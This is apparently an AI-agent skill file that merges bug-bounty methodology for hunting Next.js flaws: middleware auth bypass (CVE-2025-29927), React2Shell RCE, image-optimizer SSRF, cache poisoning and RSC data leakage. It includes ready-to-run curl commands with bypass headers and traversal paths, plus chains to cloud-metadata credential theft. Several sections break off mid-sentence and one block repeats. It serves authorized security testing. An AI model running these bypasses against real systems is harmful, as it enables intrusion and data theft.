---
name: bbhunt-nextjs
description: "Hunt Server Actions, middleware auth bypass, ISR cache poisoning, image-optimization SSRF and RSC payload leakage. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Next.js-specific vulnerability hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete fingerprints, endpoints, headers, CVEs to look for

- **CVE-2025-29927 — middleware authorization bypass (CVSS 9.1, GHSA-f82v-jwr5-mffw).** Affects self-hosted/Node-server Next.js **11.1.4 → 13.5.6**, **14.x < 14.2.25**, **15.x < 15.2.3** (also 12.3.5/13.5.9 fix lines). A single header skips middleware entirely: `X-Middleware-Subrequest`. **Vercel-hosted apps are automatically protected** — this is a self-hosted finding. Fingerprint middleware-protected routes by the response headers `x-middleware-rewrite`, `x-middleware-next`, `x-middleware-redirect` (often on a non-200 redirect to `/login` or `/unauthorized`).
- **Exact header values by version (from zhero's research / ProjectDiscovery):**
  - `< 12.2`: `x-middleware-subrequest: pages/_middleware` (nested: `pages/dashboard/_middleware`).
  - `12.2–13.1`: `x-middleware-subrequest: middleware` (or `src/middleware` for a `/src` layout).
  - `>= 13.2.0`: repeat to satisfy the recursion-depth check — `middleware:middleware:middleware:middleware:middleware` (or `src/middleware:...` ×5).
  The check occurs *before* the recursion-depth enforcement, so the repeated form works on patched-for-loop builds too.
- **CVE-2025-55182 "React2Shell" (CVSS 10.0) + CVE-2025-66478 (Next.js, rejected as duplicate).** Pre-auth RCE via insecure deserialization of the **RSC "Flight" protocol** in `react-server`. Default `create-next-app` production builds are vulnerable with no developer code changes. Affected: `react-server-dom-*` **19.0.x / 19.1.x / 19.2.x** (fixed **19.0.1 / 19.1.2 / 19.2.1**); **Next.js Ap

### Signals and surfaces

### Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

### Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Middleware bypass differential (concrete, low-noise):**
```
GET /dashboard/admin                                  -> 307 to /login + x-middleware-rewrite
GET /dashboard/admin
  X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
                                                      -> 200 + protected body  = CONFIRMED
```
  Try the `src/middleware:...` ×5 variant for `/src` layouts. Enumerate endpoints from `href="/..."` links in the base HTML; the ProjectDiscovery template tests each extracted path and requires a middleware header on the first response plus status 200 on the second.
- **Chain to impact:** the bypass only removes the middleware gate — follow through to the exposed admin panel, `/api/*` route, file-management handler, or Server Action. WAF/lb workaround to test the boundary: strip or blank `x-middleware-subrequest` at the edge (`proxy_set_header x-middleware-subrequest "";` in nginx, `RequestHeader unset` in Apache), then confirm the bypass disappears.
- **React2Shell probe concept:** the flaw is a logical deserialization bug in how the server parses RSC payloads, triggered by a crafted request with `Next-Action` / RSC-style form data. Because public exploits exist and reliability is near-100% on default configs, use a **non-destructive marker** (a uniquely named temp file or a single OOB callback) rather than dropping a shell. Patch verification: `npx fix-react2shell-next`, then confirm the bundled `react-server-dom-*` version is one of the hardened

### Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

### Middleware bypass via `x-middleware-subrequest` (CVE-2025-29927)

Next skips middleware execution entirely when this header asserts an internal subrequest — bypassing auth/redirect middleware on gated routes.
```bash
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# also: -H "x-middleware-subrequest: src/middleware"  and  "pages/_middleware"
# 200 on a middleware-gated route = bypassed. Fixed 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3.
```

### Validation and proof

### Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **CVE-2025-29927:** a 200 with the header is necessary, but also show that the *same* request without it is redirected/blocked and that the 200 body contains genuinely protected content (not just a static shell). A 200 on a public page is meaningless. A vulnerable *version* alone is not an exploitable finding — require the header differential.
- **Vercel exclusion:** if the app is demonstrably Vercel-hosted (`x-vercel-*`, `*.vercel.app`, Vercel-signed deployment headers), middleware bypass is automatically mitigated — do not report it. Self-hosted Node server, Docker, or a custom `next start` behind your own proxy is the affected deployment.
- **React2Shell:** prove execution with a unique OOB callback or a verifiable file/command artifact, and confirm the version matrix from the actual bundle (`react-server-dom-webpack` / `-turbopack` / `-parcel` in the source map or `node_modules`), not from a banner. A bare 500 from a malformed RSC payload is a crash, not RCE.
- **Post-exploitation context raises severity but is not your PoC:** if you observe XMRig, Sliver, AWS metadata access, or OAST DNS on a target during testing, report it as possible pre-existing compromise (per `mid-engagement-ir-detection`) — it is not evidence that *your* request achieved RCE.
- **Patch-check both layers:** React and Next.js ship independently; a fixed Next.js version with an unfixed bundled `react-server` (or a monorepo with multiple React copies) can still be vulnerable. Check all `react-server-dom-*` copies in the SBOM

### Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

### Escalation and related chains

### Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Source skills merged into this topic

- `hunting` — `nextjs`
- `cbh` — `hunt-nextjs`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 1 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 1 merged companion methodology documents
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
